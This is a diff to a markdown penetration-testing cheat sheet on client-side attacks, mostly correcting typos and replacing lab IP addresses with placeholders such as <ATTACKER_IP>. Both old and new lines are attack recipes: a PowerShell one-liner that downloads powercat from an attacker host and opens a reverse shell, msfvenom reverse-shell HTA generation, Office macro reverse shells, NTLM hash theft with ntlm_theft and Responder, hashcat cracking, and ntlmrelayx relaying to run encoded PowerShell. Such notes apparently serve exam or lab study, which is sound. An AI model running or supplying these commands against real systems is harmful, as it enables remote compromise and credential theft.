@@ -62,7 +62,7 @@ In evil.hta, the code will find the following command ::> `powershell.exe -nop -
 
 ## Microsoft Office
 
-**Microsoft Word Macro**: To exploit Microsoft Office we need to creare a doc in `.docm` or `.doc` format and use macros. An example of the creation of a macro to run a reverse shell is the following.
+**Microsoft Word Macro**: To exploit Microsoft Office we need to create a doc in `.docm` or `.doc` format and use macros. An example of the creation of a macro to run a reverse shell is the following.
 
 1. From your powershell, prepare the command encoded in base64
    ```
@@ -151,7 +151,7 @@ Library files consist of three major parts written in XML to specify the paramet
    			<isDefaultSaveLocation>true</isDefaultSaveLocation>
    			<isSupported>false</isSupported>
    			<simpleLocation>
-   				<url>http://IP</url>
+   				<url>http://<ATTACKER_IP></url>
    			</simpleLocation>
    		</searchConnectorDescription>
    	</searchConnectorDescriptionList>
@@ -176,18 +176,18 @@ Library files consist of three major parts written in XML to specify the paramet
 
 **NTLM theft**
 - https://github.com/Greenwolf/ntlm_theft
-- `python3 ntlm_theft.py -g all -s 192.168.45.201 -f test`
+- `python3 ntlm_theft.py -g all -s <ATTACKER_IP> -f test`
 - `sudo responder -I tun0 -v`
 - `hashcat --status -w 4 -a 0 user.hash /usr/share/wordlists/rockyou.txt -m 5600`
 
 **Redirecting NTLMv2**
 - `python2 44564.py`
 - `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
-- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.226.169 -c "powershell -e base64"`
+- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -e <BASE64>"`
   - only possible if there is an smb on the target
 
-**Upload a lmk link that redirects to the following**
-- `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213/powercat.ps1');powercat -c 192.168.45.213 -p 8039 -e powershell"`
+**Upload a lnk link that redirects to the following**
+- `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1');powercat -c <ATTACKER_IP> -p <PORT> -e powershell"`
 
 **Macro**
 - `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
@@ -196,7 +196,7 @@ Library files consist of three major parts written in XML to specify the paramet
   - Tools > Macro
   - Tools > Customize > Events > Open Document
 - Spreadsheet > This also runs macros
-- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.154 LPORT=443 -f hta-psh -o evil.hta`
+- `msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f hta-psh -o evil.hta`
   - another way to create macros, then cat the file to copy it
 
 **Send an email**
